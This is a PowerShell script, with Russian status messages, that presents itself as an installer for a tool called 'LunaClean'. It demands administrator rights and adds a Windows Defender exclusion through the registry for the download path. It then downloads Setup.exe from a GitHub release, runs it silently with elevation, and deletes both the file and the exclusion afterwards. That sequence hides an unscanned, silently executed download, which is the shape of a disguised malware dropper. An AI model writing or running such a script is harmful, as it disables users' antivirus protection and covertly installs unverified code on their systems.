$tempPath = "C:\Program Files\GoBobDev\LunaClean\Temp"
$filename = Join-Path -Path $tempPath -ChildPath "Setup.exe"
$url = "https://github.com/timinside/LunaClean/releases/latest/download/Setup.exe "

function Write-Log {
    param ([string]$message)
    Write-Host "[INFO] $message"
}

function Add-DefenderExclusionRegistry {
    param ([string]$path)
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Windows Defender\Exclusions\Paths"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force
    }
    $escapedPath = $path.Replace('\', '\\')
    Set-ItemProperty -Path $regPath -Name $escapedPath -Type DWord -Value 0 -Force
}

function Remove-DefenderExclusionRegistry {
    param ([string]$path)
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Windows Defender\Exclusions\Paths"
    if (Test-Path $regPath) {
        $escapedPath = $path.Replace('\', '\\')
        Remove-ItemProperty -Path $regPath -Name $escapedPath -ErrorAction SilentlyContinue
    }
}

function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
    return $principal.IsInRole($adminRole)
}

if (-not (Test-Admin)) {
    Write-Log "Запустите PowerShell от имени администратора!"
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

try {
    if (-not (Test-Path -Path $tempPath)) {
        New-Item -Path $tempPath -ItemType Directory
    }

    Add-DefenderExclusionRegistry -path $filename

    Write-Log "Скачивание LunaClean..."
    Invoke-WebRequest -Uri $url -OutFile $filename -ErrorAction Stop

    Write-Log "Установка LunaClean..."
    Start-Process -FilePath $filename -ArgumentList '/VERYSILENT /TASKS="desktopicon"' -Verb RunAs -Wait

    $removeCommandXTweaker = "Remove-Item -Path '$filename' -ErrorAction Stop"
    Start-Process -FilePath "powershell" -ArgumentList "-Command $removeCommandXTweaker" -Verb RunAs -Wait

    Remove-DefenderExclusionRegistry -path $filename

    Write-Log "Установка завершена. Спасибо за выбор."

} catch {
    Write-Log "Ошибка: $_"
}